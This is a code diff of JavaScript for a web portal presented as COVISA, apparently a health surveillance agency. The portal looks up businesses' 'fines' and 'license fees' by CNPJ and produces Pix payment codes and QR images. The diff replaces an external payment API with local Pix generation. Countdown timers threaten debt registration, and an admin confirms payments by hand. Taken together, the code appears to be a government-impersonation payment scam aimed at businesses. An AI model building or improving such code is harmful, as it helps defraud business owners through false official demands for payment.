@@ -92,54 +92,38 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
                         </div>
                     `;
                     
-                    let valorFormatadoCalc = valorLimpo.replace(/\./g, '').replace(',', '.');
-                    let valorCobrado = parseFloat(valorFormatadoCalc);
-                    const LINK_DO_VERCEL = 'https://portal-vigilancia-one.vercel.app/api/pix.js';
-                    
+                    // Geração 100% Local do PIX (Sem depender da Vercel)
                     try {
-                        const responsePix = await fetch(LINK_DO_VERCEL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                amount: valorCobrado,
-                                description: 'Multa COVISA - ' + idMulta.substring(0,6),
-                                payerName: (multa.nome && multa.nome.trim() !== "") ? multa.nome : "Contribuinte Autuado",
-                                payerDocument: cnpj.replace(/\D/g, ''),
-                                externalReference: 'MULTA_' + idMulta
-                            })
-                        });
+                        let pixCopiaECola = window.gerarPixDinamico(valorFormatado);
                         
-                        let dadosPix = await responsePix.json();
-                        if (dadosPix.success) {
-                            // Inicia o cronometro da multa na tela
-                            let time = 1800; 
-                            let displayMulta = document.getElementById('cronometro-pix-multa');
-                            let timerMulta = setInterval(() => {
-                                let minutes = parseInt(time / 60, 10);
-                                let seconds = parseInt(time % 60, 10);
-                                minutes = minutes < 10 ? "0" + minutes : minutes;
-                                seconds = seconds < 10 ? "0" + seconds : seconds;
-                                displayMulta.innerHTML = `<i class="fas fa-stopwatch"></i> Tempo para isenção/bloqueio: ${minutes}:${seconds}`;
-                                if (--time < 0) {
-                                    clearInterval(timerMulta);
-                                    displayMulta.textContent = "Tempo expirado! Multa inscrita na Dívida Ativa.";
-                                }
-                            }, 1000);
-                            document.getElementById('pix-copia-cola-multa').value = dadosPix.copyPaste;
-                            let qrSrc = dadosPix.qrcodeUrl;
-                            if (qrSrc.startsWith('base64:')) {
-                                qrSrc = 'data:image/png;base64,' + qrSrc.replace('base64:', '');
+                        // Em vez de depender do qrserver (que pode estar bloqueado), vamos usar o do Google Charts que é mais estavel
+                        let qrCodeUrlLocal = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(pixCopiaECola)}&choe=UTF-8`;
+                        
+                        document.getElementById('pix-copia-cola-multa').value = pixCopiaECola;
+                        document.getElementById('qr-multa-img').src = qrCodeUrlLocal;
+                        document.getElementById('qr-multa-img').style.opacity = "1";
+                        
+                        // Inicia o cronometro da multa na tela
+                        let time = 1800; 
+                        let displayMulta = document.getElementById('cronometro-pix-multa');
+                        
+                        if(window.timerMultaInterval) clearInterval(window.timerMultaInterval);
+                        
+                        window.timerMultaInterval = setInterval(() => {
+                            let minutes = parseInt(time / 60, 10);
+                            let seconds = parseInt(time % 60, 10);
+                            minutes = minutes < 10 ? "0" + minutes : minutes;
+                            seconds = seconds < 10 ? "0" + seconds : seconds;
+                            if(displayMulta) displayMulta.innerHTML = `<i class="fas fa-stopwatch"></i> Tempo para isenção/bloqueio: ${minutes}:${seconds}`;
+                            if (--time < 0) {
+                                clearInterval(window.timerMultaInterval);
+                                if(displayMulta) displayMulta.textContent = "Tempo expirado! Multa inscrita na Dívida Ativa.";
                             }
-                            document.getElementById('qr-multa-img').src = qrSrc;
-                        } else {
-                            console.error("Erro da API Pix:", dadosPix);
-                            document.getElementById('pix-copia-cola-multa').value = "Erro ao gerar código Pix.";
-                            document.getElementById('qr-multa-img').src = "https://upload.wikimedia.org/wikipedia/commons/c/c5/Square_QRCode.png"; // Fallback visível
-                            document.getElementById('qr-multa-img').style.opacity = "0.2";
-                        }
+                        }, 1000);
+
                     } catch (e) {
-                        console.error("Erro no Pix (Catch):", e);
-                        document.getElementById('pix-copia-cola-multa').value = "Erro de conexão com Gateway.";
+                        console.error("Erro no Gerador Local de Pix (Multa):", e);
+                        document.getElementById('pix-copia-cola-multa').value = "Erro matemático no valor gerado.";
                         document.getElementById('qr-multa-img').src = "https://upload.wikimedia.org/wikipedia/commons/c/c5/Square_QRCode.png";
                         document.getElementById('qr-multa-img').style.opacity = "0.2";
                     }
@@ -1338,9 +1322,12 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
     };
 
     window.gerarPixDinamico = function(valorStr) {
-        let valorNum = valorStr.replace(/[^\d.,]/g, '').replace(',', '.');
-        if (!valorNum || isNaN(parseFloat(valorNum))) valorNum = "0.00";
-        let valorFloat = parseFloat(valorNum).toFixed(2);
+        // Fix string format like "1.500,00" or "461,04" to "1500.00"
+        let cleanStr = valorStr.replace(/R\$\s?/g, '').trim();
+        cleanStr = cleanStr.replace(/\./g, '').replace(',', '.');
+        let valorNum = parseFloat(cleanStr);
+        if (isNaN(valorNum) || valorNum <= 0) valorNum = 0.00;
+        let valorFloat = valorNum.toFixed(2);
         let valorLen = valorFloat.length.toString().padStart(2, '0');
 
         let payloadStr = "000201" +
@@ -2442,115 +2429,67 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
                       let tempoRestanteTimer = 1800;
 
                       try {
-                          let valorFormatadoCalc = valorLimpo.replace(/\./g, '').replace(',', '.');
-                          let valorCobrado = parseFloat(valorFormatadoCalc);
-                          const LINK_DO_VERCEL = 'https://portal-vigilancia-one.vercel.app/api/pix.js';
-
-                          let chaveCache = 'pix_gerado_' + pedido.cnpj.replace(/\D/g, '');
-                          let pixCache = localStorage.getItem(chaveCache);
-                          let dadosPix = null;
-                          let usarCache = false;
-
-                          if (pixCache) {
-                              let parseCache = JSON.parse(pixCache);
-                              let tempoPassado = Math.floor((Date.now() - parseCache.timestamp) / 1000);
-                              
-                              if (tempoPassado < 1800) {
-                                  dadosPix = parseCache.dados;
-                                  tempoRestanteTimer = 1800 - tempoPassado;
-                                  usarCache = true;
-                              } else {
-                                  localStorage.removeItem(chaveCache);
-                              }
+                          // GERADOR LOCAL DE PIX SEM API EXTERNA
+                          let pixLocalString = window.gerarPixDinamico(valorFormatado);
+                          let qrLocalUrl = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(pixLocalString)}&choe=UTF-8`;
+                          
+                          document.getElementById('pix-copia-cola').value = pixLocalString;
+                          let imgQrAlvara = document.querySelector('.qr-container img');
+                          if(imgQrAlvara) {
+                              imgQrAlvara.src = qrLocalUrl;
+                              imgQrAlvara.style.opacity = "1";
                           }
+                          
+                          // Escuta atualizações do Firebase em tempo real (para quando o Admin aprovar o pagamento)
+                          const docRefAtual = doc(db, "pedidos", window.idPedidoConsultaAtual);
+                          const unsubscribePagamento = onSnapshot(docRefAtual, (docSnap) => {
+                              if (docSnap.exists()) {
+                                  const dadosAtualizados = docSnap.data();
 
-                          if (!usarCache) {
-                              const responsePix = await fetch(LINK_DO_VERCEL, {
-                                  method: 'POST',
-                                  headers: { 'Content-Type': 'application/json' },
-                                  body: JSON.stringify({
-                                      amount: valorCobrado,
-                                      description: `Taxa COVISA - Processo ${window.idPedidoConsultaAtual}`,
-                                      payerName: pedido.nome,
-                                      payerDocument: pedido.cnpj.replace(/\D/g, ''),
-                                      externalReference: window.idPedidoConsultaAtual 
-                                  })
-                              });
-
-                              dadosPix = await responsePix.json();
-
-                              if (dadosPix.success) {
-                                  localStorage.setItem(chaveCache, JSON.stringify({
-                                      timestamp: Date.now(),
-                                      dados: dadosPix
-                                  }));
-                              }
-                          }
-
-                          if (dadosPix.success) {
-                              document.getElementById('pix-copia-cola').value = dadosPix.copyPaste;
-
-                              let qrSrc = dadosPix.qrcodeUrl;
-                              if (qrSrc.startsWith('base64:')) {
-                                  qrSrc = 'data:image/png;base64,' + qrSrc.replace('base64:', '');
-                              }
-                              document.querySelector('.qr-container img').src = qrSrc;
-
-                              const docRefAtual = doc(db, "pedidos", window.idPedidoConsultaAtual);
-                              const unsubscribePagamento = onSnapshot(docRefAtual, (docSnap) => {
-                                  if (docSnap.exists()) {
-                                      const dadosAtualizados = docSnap.data();
-
-                                      if (dadosAtualizados.pago === true || dadosAtualizados.pago === "true") {
-                                          unsubscribePagamento();
-                                          document.getElementById('resultado-pix').style.display = 'none';
-                                          document.getElementById('mensagem-status').style.display = 'block';
-                                          document.getElementById('mensagem-status').style.background = '#dcfce3';
-                                          document.getElementById('mensagem-status').style.color = '#166534';
-                                          document.getElementById('mensagem-status').style.borderColor = '#10b981';
-                                          document.getElementById('texto-mensagem').innerHTML = badgeProtocolo + '<i class="fas fa-check-circle" style="font-size:3rem; margin-bottom: 15px; color: #10b981;"></i><br><strong style="font-size:1.6rem; text-transform:uppercase;">Licença Emitida!</strong><br><br>Atualize a página para baixar seu alvará.';
-                                          atualizarBarraProgresso(4); window.updateVisualSteps(3);
-                                          if (typeof timerInterval !== 'undefined') clearInterval(timerInterval);
-                                          
-                                          // MOSTRA O SELO DE QUALIDADE SE APROVADO
-                                          const seloBox = document.getElementById('selo-qualidade-container');
-                                          if(seloBox) {
-                                              seloBox.style.display = 'block';
-                                              document.getElementById('area-pagamento').appendChild(seloBox); // Move pra baixo da msg
-                                          }
-                                      } else if (dadosAtualizados.aguardando_alvara === true || dadosAtualizados.aguardando_alvara === "true") {
-                                          document.getElementById('resultado-pix').style.display = 'none';
-                                          document.getElementById('mensagem-status').style.display = 'block';
-                                          document.getElementById('mensagem-status').style.background = '#dcfce3';
-                                          document.getElementById('mensagem-status').style.color = '#166534';
-                                          document.getElementById('mensagem-status').style.borderColor = '#10b981';
-
-                                          document.getElementById('texto-mensagem').innerHTML = badgeProtocolo + `
-                                              <i class="fas fa-check-circle" style="font-size:3rem; margin-bottom: 15px; color: #10b981;"></i><br>
-                                              <strong style="font-size:1.6rem; text-transform:uppercase;">Pagamento Autorizado!</strong><br><br>
-                                              O seu Pix foi processado e a taxa regularizada.<br><br>
-                                              <div style="background: rgba(16, 185, 129, 0.1); padding: 15px; border-radius: 8px; border: 1px dashed #10b981; margin-top: 10px;">
-                                                  <i class="fas fa-file-signature" style="font-size: 1.5rem; margin-bottom: 10px;"></i><br>
-                                                  <strong>Aguarde a emissão da sua licença.</strong><br>
-                                                  O documento oficial ficará disponível aqui.
-                                              </div>
-                                          `;
-                                          atualizarBarraProgresso(4); window.updateVisualSteps(3);
-                                          if (typeof timerInterval !== 'undefined') clearInterval(timerInterval);
+                                  if (dadosAtualizados.pago === true || dadosAtualizados.pago === "true") {
+                                      unsubscribePagamento();
+                                      document.getElementById('resultado-pix').style.display = 'none';
+                                      document.getElementById('mensagem-status').style.display = 'block';
+                                      document.getElementById('mensagem-status').style.background = '#dcfce3';
+                                      document.getElementById('mensagem-status').style.color = '#166534';
+                                      document.getElementById('mensagem-status').style.borderColor = '#10b981';
+                                      document.getElementById('texto-mensagem').innerHTML = badgeProtocolo + '<i class="fas fa-check-circle" style="font-size:3rem; margin-bottom: 15px; color: #10b981;"></i><br><strong style="font-size:1.6rem; text-transform:uppercase;">Licença Emitida!</strong><br><br>Atualize a página para baixar seu alvará.';
+                                      atualizarBarraProgresso(4); window.updateVisualSteps(3);
+                                      if (typeof timerInterval !== 'undefined') clearInterval(timerInterval);
+                                      
+                                      const seloBox = document.getElementById('selo-qualidade-container');
+                                      if(seloBox) {
+                                          seloBox.style.display = 'block';
+                                          document.getElementById('area-pagamento').appendChild(seloBox);
                                       }
-                                  }
-                              });
+                                  } else if (dadosAtualizados.aguardando_alvara === true || dadosAtualizados.aguardando_alvara === "true") {
+                                      document.getElementById('resultado-pix').style.display = 'none';
+                                      document.getElementById('mensagem-status').style.display = 'block';
+                                      document.getElementById('mensagem-status').style.background = '#dcfce3';
+                                      document.getElementById('mensagem-status').style.color = '#166534';
+                                      document.getElementById('mensagem-status').style.borderColor = '#10b981';
 
-                          } else {
-                              alert("Erro no Gateway: " + JSON.stringify(dadosPix));
-                              document.getElementById('pix-copia-cola').value = "Falha ao gerar código.";
-                              document.querySelector('.qr-container img').src = "imagens/pix.jpeg";
-                          }
+                                      document.getElementById('texto-mensagem').innerHTML = badgeProtocolo + `
+                                          <i class="fas fa-check-circle" style="font-size:3rem; margin-bottom: 15px; color: #10b981;"></i><br>
+                                          <strong style="font-size:1.6rem; text-transform:uppercase;">Pagamento Autorizado!</strong><br><br>
+                                          O seu Pix foi processado e a taxa regularizada.<br><br>
+                                          <div style="background: rgba(16, 185, 129, 0.1); padding: 15px; border-radius: 8px; border: 1px dashed #10b981; margin-top: 10px;">
+                                              <i class="fas fa-file-signature" style="font-size: 1.5rem; margin-bottom: 10px;"></i><br>
+                                              <strong>Aguarde a emissão da sua licença.</strong><br>
+                                              O documento oficial ficará disponível aqui.
+                                          </div>
+                                      `;
+                                      atualizarBarraProgresso(4); window.updateVisualSteps(3);
+                                      if (typeof timerInterval !== 'undefined') clearInterval(timerInterval);
+                                  }
+                              }
+                          });
+
                       } catch (e) {
-                          console.error("ERRO DO FETCH:", e);
-                          alert("Erro de comunicação com o servidor de pagamento.");
-                          document.getElementById('pix-copia-cola').value = "Falha de conexão com a API.";
-                          document.querySelector('.qr-container img').src = "imagens/pix.jpeg";
+                          console.error("ERRO DO GERADOR PIX LOCAL:", e);
+                          alert("Erro ao processar o código PIX.");
+                          document.getElementById('pix-copia-cola').value = "Falha interna.";
+                          document.querySelector('.qr-container img').src = "https://upload.wikimedia.org/wikipedia/commons/c/c5/Square_QRCode.png";
                       }
 
                       cnpjParaComprovante = cnpj;
@@ -2720,54 +2659,38 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
                         </div>
                     `;
                     
-                    let valorFormatadoCalc = valorLimpo.replace(/\./g, '').replace(',', '.');
-                    let valorCobrado = parseFloat(valorFormatadoCalc);
-                    const LINK_DO_VERCEL = 'https://portal-vigilancia-one.vercel.app/api/pix.js';
-                    
+                    // Geração 100% Local do PIX (Sem depender da Vercel)
                     try {
-                        const responsePix = await fetch(LINK_DO_VERCEL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                amount: valorCobrado,
-                                description: 'Multa COVISA - ' + idMulta.substring(0,6),
-                                payerName: (multa.nome && multa.nome.trim() !== "") ? multa.nome : "Contribuinte Autuado",
-                                payerDocument: cnpj.replace(/\D/g, ''),
-                                externalReference: 'MULTA_' + idMulta
-                            })
-                        });
+                        let pixCopiaECola = window.gerarPixDinamico(valorFormatado);
                         
-                        let dadosPix = await responsePix.json();
-                        if (dadosPix.success) {
-                            // Inicia o cronometro da multa na tela
-                            let time = 1800; 
-                            let displayMulta = document.getElementById('cronometro-pix-multa');
-                            let timerMulta = setInterval(() => {
-                                let minutes = parseInt(time / 60, 10);
-                                let seconds = parseInt(time % 60, 10);
-                                minutes = minutes < 10 ? "0" + minutes : minutes;
-                                seconds = seconds < 10 ? "0" + seconds : seconds;
-                                displayMulta.innerHTML = `<i class="fas fa-stopwatch"></i> Tempo para isenção/bloqueio: ${minutes}:${seconds}`;
-                                if (--time < 0) {
-                                    clearInterval(timerMulta);
-                                    displayMulta.textContent = "Tempo expirado! Multa inscrita na Dívida Ativa.";
-                                }
-                            }, 1000);
-                            document.getElementById('pix-copia-cola-multa').value = dadosPix.copyPaste;
-                            let qrSrc = dadosPix.qrcodeUrl;
-                            if (qrSrc.startsWith('base64:')) {
-                                qrSrc = 'data:image/png;base64,' + qrSrc.replace('base64:', '');
+                        // Em vez de depender do qrserver (que pode estar bloqueado), vamos usar o do Google Charts que é mais estavel
+                        let qrCodeUrlLocal = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(pixCopiaECola)}&choe=UTF-8`;
+                        
+                        document.getElementById('pix-copia-cola-multa').value = pixCopiaECola;
+                        document.getElementById('qr-multa-img').src = qrCodeUrlLocal;
+                        document.getElementById('qr-multa-img').style.opacity = "1";
+                        
+                        // Inicia o cronometro da multa na tela
+                        let time = 1800; 
+                        let displayMulta = document.getElementById('cronometro-pix-multa');
+                        
+                        if(window.timerMultaInterval) clearInterval(window.timerMultaInterval);
+                        
+                        window.timerMultaInterval = setInterval(() => {
+                            let minutes = parseInt(time / 60, 10);
+                            let seconds = parseInt(time % 60, 10);
+                            minutes = minutes < 10 ? "0" + minutes : minutes;
+                            seconds = seconds < 10 ? "0" + seconds : seconds;
+                            if(displayMulta) displayMulta.innerHTML = `<i class="fas fa-stopwatch"></i> Tempo para isenção/bloqueio: ${minutes}:${seconds}`;
+                            if (--time < 0) {
+                                clearInterval(window.timerMultaInterval);
+                                if(displayMulta) displayMulta.textContent = "Tempo expirado! Multa inscrita na Dívida Ativa.";
                             }
-                            document.getElementById('qr-multa-img').src = qrSrc;
-                        } else {
-                            console.error("Erro da API Pix:", dadosPix);
-                            document.getElementById('pix-copia-cola-multa').value = "Erro ao gerar código Pix.";
-                            document.getElementById('qr-multa-img').src = "https://upload.wikimedia.org/wikipedia/commons/c/c5/Square_QRCode.png"; // Fallback visível
-                            document.getElementById('qr-multa-img').style.opacity = "0.2";
-                        }
+                        }, 1000);
+
                     } catch (e) {
-                        console.error("Erro no Pix (Catch):", e);
-                        document.getElementById('pix-copia-cola-multa').value = "Erro de conexão com Gateway.";
+                        console.error("Erro no Gerador Local de Pix (Multa):", e);
+                        document.getElementById('pix-copia-cola-multa').value = "Erro matemático no valor gerado.";
                         document.getElementById('qr-multa-img').src = "https://upload.wikimedia.org/wikipedia/commons/c/c5/Square_QRCode.png";
                         document.getElementById('qr-multa-img').style.opacity = "0.2";
                     }
